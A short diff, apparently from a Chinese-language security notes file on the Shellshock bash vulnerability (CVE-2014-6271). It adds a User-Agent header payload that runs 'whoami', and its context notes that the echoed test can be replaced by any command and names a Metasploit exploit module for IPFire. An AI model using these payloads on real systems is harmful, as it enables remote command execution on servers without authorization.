@@ -53,6 +53,8 @@
 
     执行命令后,如果显示 Vulnerable CVE-2014-6271,证系统存在漏洞,可改变 echo Vulnerable CVE-2014-6271 为任意命令进行执行.
 
+    `User-Agent: () { :;}; whoami`
+
 - MSF 模块
     ```bash
     use exploit/linux/http/ipfire_bashbug_exec
